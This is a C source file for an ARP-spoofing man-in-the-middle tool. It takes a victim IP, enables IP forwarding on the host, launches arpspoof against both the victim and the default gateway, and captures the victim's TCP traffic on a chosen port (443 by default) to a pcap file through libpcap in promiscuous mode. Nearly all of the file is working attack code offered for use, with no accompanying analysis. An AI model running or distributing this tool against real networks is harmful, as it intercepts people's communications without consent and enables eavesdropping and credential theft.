#include <stdio.h>      //standard input/output functions
#include <stdlib.h>     //process functions
#include <string.h>     //string functions
#include <unistd.h>     //posix functions
#include <arpa/inet.h>  //ip adress manipulation
#include <stdint.h>     //to use uint32_t
#include <sys/wait.h>   //wait() 
#include <signal.h>     //signal handling
#include <pcap.h>       //packet capture

//                   _        _                         
//   _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___ 
//  | '_ \| '__/ _ \| __/ _ \| __| | | | '_ \ / _ \/ __|
//  | |_) | | | (_) | || (_) | |_| |_| | |_) |  __/\__ \
//  | .__/|_|  \___/ \__\___/ \__|\__, | .__/ \___||___/
//  |_|                           |___/|_|              


int parse_arguments(int argc, char *argv[],char **victim_ip,char **log_dir,int *port);
int validate_ipv4(const char *ip);
int validate_port(const char *s);
int get_gateway_ip(char *gateway_ip, size_t len);
int enable_ip_forwarding();
int get_default_interface(char *iface, size_t size);
int start_arp_spoofing(const char *victim_ip,const char *gateway_ip,const char *iface);
int start_packet_capture(const char *iface,int port,const char *log_path);

pid_t arp_pids[2];
pid_t cap_pid;

//       _                   _    _                     _ _ _             
//   ___(_) __ _ _ __   __ _| |  | |__   __ _ _ __   __| | (_)_ __   __ _ 
//  / __| |/ _` | '_ \ / _` | |  | '_ \ / _` | '_ \ / _` | | | '_ \ / _` |
//  \__ \ | (_| | | | | (_| | |  | | | | (_| | | | | (_| | | | | | | (_| |
//  |___/_|\__, |_| |_|\__,_|_|  |_| |_|\__,_|_| |_|\__,_|_|_|_| |_|\__, |
//         |___/                                                   |___/ 


void cleanup(int sig){
    printf("\n[!] Termination signal received\n");
    printf("[*] Stopping ARP spoofing and packet capture...\n");

    for(int i=0;i<2;i++){
        if(arp_pids[i] > 0)
            kill(arp_pids[i], SIGTERM);//kill child if running 
    }

    if(cap_pid > 0)
        kill(cap_pid, SIGTERM);//Stop packet capture process if it is running

    sleep(1);

    for(int i=0;i<2;i++){
        if(arp_pids[i] > 0)
            kill(arp_pids[i], SIGKILL);//force kill them if they didnt stop
    }

    if(cap_pid > 0)
        kill(cap_pid, SIGKILL);// force kill packet capture

    printf("[+] Cleanup complete\n");
    exit(0);
}

//   __  __       _       
//  |  \/  | __ _(_)_ __  
//  | |\/| |/ _` | | '_ \ 
//  | |  | | (_| | | | | |
//  |_|  |_|\__,_|_|_| |_|

int main(int argc, char *argv[]){

    if(geteuid() != 0){
        fprintf(stderr,"Error: This program must be run as root\n");
        return 1;
    }

    char *victim_ip = NULL;
    char *log_dir   = NULL;
    int port = 443;

    char gateway_ip[INET_ADDRSTRLEN];
    char iface[32];
    char log_path[256];

    signal(SIGINT, cleanup);
    signal(SIGTERM, cleanup);

    printf("[*] Parsing arguments...\n");
    if (parse_arguments(argc, argv, &victim_ip, &log_dir, &port) != 0){
        fprintf(stderr,"Usage: %s -v <victim_ip> -o <log_dir> [-p port]\n",argv[0]);
        return 1;
    }

    printf("[*] Validating victim IP...\n");
    if (validate_ipv4(victim_ip) != 0) {
        fprintf(stderr, "Invalid victim IP\n");
        return 1;
    }

    printf("[*] Discovering default gateway...\n");
    if (get_gateway_ip(gateway_ip, sizeof(gateway_ip)) != 0) {
        fprintf(stderr, "Failed to get gateway IP\n");
        return 1;
    }

    printf("[*] Discovering default interface...\n");
    if (get_default_interface(iface, sizeof(iface)) != 0) {
        fprintf(stderr, "Failed to get interface\n");
        return 1;
    }

    printf("[*] Enabling IP forwarding...\n");
    if (enable_ip_forwarding() != 0) {
        fprintf(stderr, "Failed to enable IP forwarding\n");
        return 1;
    }

    printf("[*] Checking for arpspoof tool...\n");
    if(system("which arpspoof > /dev/null 2>&1") != 0){
        fprintf(stderr,"Error: arpspoof not found. Install with: apt install dsniff\n");
        return 1;
    }

    printf("[*] Starting ARP spoofing...\n");
    if (start_arp_spoofing(victim_ip, gateway_ip, iface) != 0) {
        fprintf(stderr, "Failed to start ARP spoofing\n");
        return 1;
    }

    snprintf(log_path,sizeof(log_path),"%s/capture_%s_%d.pcap",log_dir,victim_ip,port);

    printf("[*] Launching packet capture...\n");
    cap_pid = fork();
    if(cap_pid == 0){
        start_packet_capture(iface,port,log_path);
        exit(0);
    }

    printf("\n========= SESSION INFO =========\n");
    printf("[+] Victim IP     : %s\n", victim_ip);
    printf("[+] Gateway IP    : %s\n", gateway_ip);
    printf("[+] Interface     : %s\n", iface);
    printf("[+] Capture Port  : %d\n", port);
    printf("[+] Log File      : %s\n", log_path);
    printf("[+] Status        : MITM ACTIVE\n");
    printf("================================\n");

    pause();
    return 0;
}

//   ____        __ _       _ _   _                 
//  |  _ \  ___ / _(_)_ __ (_) |_(_) ___  _ __  ___ 
//  | | | |/ _ \ |_| | '_ \| | __| |/ _ \| '_ \/ __|
//  | |_| |  __/  _| | | | | | |_| | (_) | | | \__ \
//  |____/ \___|_| |_|_| |_|_|\__|_|\___/|_| |_|___/

int parse_arguments(int argc, char *argv[],char **victim_ip,char **log_dir,int *port){

    int opt;
    *victim_ip = NULL;
    *log_dir   = NULL;
    *port      = 443;//default port 

    while ((opt = getopt(argc, argv, "v:o:p:")) != -1) {
        switch (opt) {
            case 'v': *victim_ip = optarg; break;
            case 'o': *log_dir = optarg; break;
            case 'p': {
                int p = validate_port(optarg);
                if (p < 0) return -1;
                *port = p;
                break;
            }
            default: return -1;
        }
    }
    if (!*victim_ip || !*log_dir) return -1;
    return 0;
}

int validate_ipv4(const char *ip){
    struct in_addr addr;
    if (inet_pton(AF_INET, ip, &addr) != 1) return -1;// Convert the IPv4 string to binary form 0 invalid format -1 error
    uint32_t ip_host = ntohl(addr.s_addr);// Convert IP from network byte order to host byte order
    if (ip_host == 0x00000000 || ip_host == 0xFFFFFFFF) return -1;//ip different from broadcast adress and network adress
    return 0;
}

int validate_port(const char *s){
    char *end;
    long p = strtol(s, &end, 10);// Convert the string to a long integer 
    if (*end != '\0' || p < 1 || p > 65535) return -1; // check p as valid port number and the string doesnt contain non-numeric characters
    return (int)p;
}

int get_gateway_ip(char *gateway_ip, size_t len){
    //format default via ip dev eth0 so we should extract ip which is right after via 
    FILE *fp = popen("ip route show default", "r");
    if (!fp) return -1;
    char line[256];
    if (!fgets(line, sizeof(line), fp)) { pclose(fp); return -1; }
    pclose(fp);
    char *via = strstr(line,"via ");
    if(!via) return -1;
    via += 4;
    sscanf(via,"%15s",gateway_ip);
    return 0;
}

int enable_ip_forwarding(){
    FILE *fp = fopen("/proc/sys/net/ipv4/ip_forward","w");
    if(!fp) return -1;
    fprintf(fp,"1\n");
    fclose(fp);
    return 0;
}

int get_default_interface(char *iface, size_t size){
    // default via ip dev eth0 extracting interface which is right after dev 
    FILE *fp = popen("ip route show default", "r");
    if (!fp) return -1;
    char line[256];
    if (!fgets(line,sizeof(line),fp)) { pclose(fp); return -1; }
    pclose(fp);
    char *dev = strstr(line,"dev ");
    if(!dev) return -1;
    dev += 4;
    sscanf(dev,"%31s",iface);
    return 0;
}

int start_arp_spoofing(const char *victim_ip,const char *gateway_ip,const char *iface){

    arp_pids[0] = fork();
    if (arp_pids[0] == 0){
        execlp("arpspoof","arpspoof","-i",iface,"-t",victim_ip,gateway_ip,NULL);
        exit(1);
    }

    arp_pids[1] = fork();
    if (arp_pids[1] == 0){
        execlp("arpspoof","arpspoof","-i",iface,"-t",gateway_ip,victim_ip,NULL);
        exit(1);
    }

    return 0;
}
// Callback function used by pcap_loop to process each captured packet
void packet_handler(u_char *user,const struct pcap_pkthdr *h,const u_char *bytes){
    pcap_dumper_t *dumper = (pcap_dumper_t *)user;  // retrieve dumper passed via pcap_loop
    pcap_dump((u_char *)dumper, h, bytes);          // write packet to pcap file
}

int start_packet_capture(const char *iface,int port,const char *log_path){

    char errbuf[PCAP_ERRBUF_SIZE];

    // Open interface in promiscuous mode to capture packets
    //promiscuous mode is enabled, the NIC passes every frame it sees to the OS, even if the destination MAC is not yours.
    pcap_t *handle = pcap_open_live(iface,BUFSIZ,1,1000,errbuf);
    if(!handle){
        fprintf(stderr,"pcap_open_live: %s\n",errbuf);
        return -1;
    }

    struct bpf_program fp;
    char filter[64];

    // Build BPF filter to capture only TCP traffic on the specified port
    snprintf(filter,sizeof(filter),"tcp port %d",port);

    if(pcap_compile(handle,&fp,filter,0,PCAP_NETMASK_UNKNOWN)==-1)
        return -1;

    if(pcap_setfilter(handle,&fp)==-1)
        return -1;

    // Open output file where captured packets will be stored
    pcap_dumper_t *dumper = pcap_dump_open(handle,log_path);
    if(!dumper) return -1;

    printf("[+] Packet capture started \n");

    // Start capture loop (-1 means capture indefinitely)
    pcap_loop(handle,-1,packet_handler,(u_char *)dumper);

    pcap_dump_close(dumper);
    pcap_close(handle);
    return 0;
}
